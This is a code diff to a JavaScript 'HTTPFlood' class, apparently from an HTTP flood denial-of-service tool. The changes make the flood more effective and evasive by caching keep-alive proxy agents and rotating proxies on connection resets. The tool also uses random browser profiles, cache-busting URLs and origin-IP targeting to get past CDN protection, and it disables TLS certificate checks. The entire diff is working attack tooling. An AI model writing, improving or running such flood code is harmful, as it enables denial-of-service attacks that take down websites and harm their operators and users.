@@ -739,9 +739,12 @@ class HTTPFlood {
         let failCount = 0;
         let successCount = 0;
         let localCount = 0;
+        let cachedAgent = null;
+        let lastProxyIndex = -1;
         
         const profile = getRandomElement(BROWSER_PROFILES);
         const useProxy = config.proxies.length > 0;
+        const isHttpsTarget = this.url.startsWith('https://');
         
         const endTime = Date.now() + this.duration * 1000;
         
@@ -750,6 +753,12 @@ class HTTPFlood {
             
             try {
                 const headers = getAdvancedHeaders(this.url, profile);
+                
+                // Add keep-alive for proxy compatibility
+                if (useProxy) {
+                    headers['Connection'] = 'keep-alive';
+                }
+                
                 let targetUrl = this.url;
                 
                 if (this.originIPs.length > 0 && this.useOrigin) {
@@ -762,12 +771,23 @@ class HTTPFlood {
                 
                 targetUrl = addCacheBuster(targetUrl);
                 
-                let agent = null;
+                // Reuse agent per thread for better connection handling
                 if (useProxy) {
-                    const proxy = config.proxies[proxyIndex];
-                    agent = proxy.startsWith('https') 
-                        ? new HttpsProxyAgent(proxy, { rejectUnauthorized: false })
-                        : new HttpProxyAgent(proxy);
+                    if (proxyIndex !== lastProxyIndex || !cachedAgent) {
+                        const proxy = config.proxies[proxyIndex];
+                        // Choose agent based on target protocol, not proxy protocol
+                        cachedAgent = isHttpsTarget
+                            ? new HttpsProxyAgent(proxy, { 
+                                rejectUnauthorized: false,
+                                keepAlive: true,
+                                keepAliveMsecs: 1000
+                              })
+                            : new HttpProxyAgent(proxy, {
+                                keepAlive: true,
+                                keepAliveMsecs: 1000
+                              });
+                        lastProxyIndex = proxyIndex;
+                    }
                 }
                 
                 const axiosConfig = {
@@ -780,9 +800,13 @@ class HTTPFlood {
                     decompress: true
                 };
                 
-                if (useProxy && agent) {
-                    axiosConfig.httpsAgent = agent;
-                    axiosConfig.httpAgent = agent;
+                if (useProxy && cachedAgent) {
+                    // Set only the correct agent based on target protocol
+                    if (isHttpsTarget) {
+                        axiosConfig.httpsAgent = cachedAgent;
+                    } else {
+                        axiosConfig.httpAgent = cachedAgent;
+                    }
                     axiosConfig.proxy = false;
                 }
                 
@@ -813,6 +837,9 @@ class HTTPFlood {
                 
                 localCount++;
                 
+                // Add small delay between requests to avoid rate limiting
+                await new Promise(resolve => setTimeout(resolve, 50));
+                
                 if (config.maxRPS && useProxy) {
                     const elapsed = (Date.now() - config.stats.startTime) / 1000;
                     const currentRate = config.stats.totalRequests / elapsed;
@@ -827,11 +854,28 @@ class HTTPFlood {
                 
                 failCount++;
                 
+                const errorCode = error.code || 'UNKNOWN';
+                
                 if (config.debug && failCount <= 3) {
-                    console.log(`[DEBUG] T${threadId}: ERROR - ${error.code || error.message} - Proxy: ${useProxy ? config.proxies[proxyIndex].substring(0, 20) : 'NO'}`);
+                    console.log(`[DEBUG] T${threadId}: ERROR - ${errorCode} - ${error.message?.substring(0, 50)} - Proxy: ${useProxy ? config.proxies[proxyIndex].substring(0, 20) : 'NO'}`);
                 }
                 
-                if (useProxy && failCount >= 3) {
+                // Handle connection reset errors
+                if (useProxy && (errorCode === 'ECONNRESET' || errorCode === 'ECONNREFUSED' || errorCode === 'EPIPE')) {
+                    // Clear cached agent on connection errors
+                    cachedAgent = null;
+                    
+                    if (failCount >= 3) {
+                        proxyIndex = (proxyIndex + 1) % config.proxies.length;
+                        failCount = 0;
+                        if (config.debug) {
+                            console.log(`[DEBUG] T${threadId}: Rotating to next proxy after connection errors`);
+                        }
+                    }
+                    // Add delay on connection errors
+                    await new Promise(resolve => setTimeout(resolve, 200));
+                } else if (useProxy && failCount >= 3) {
+                    cachedAgent = null;
                     proxyIndex = (proxyIndex + 1) % config.proxies.length;
                     failCount = 0;
                     await new Promise(resolve => setTimeout(resolve, 100));
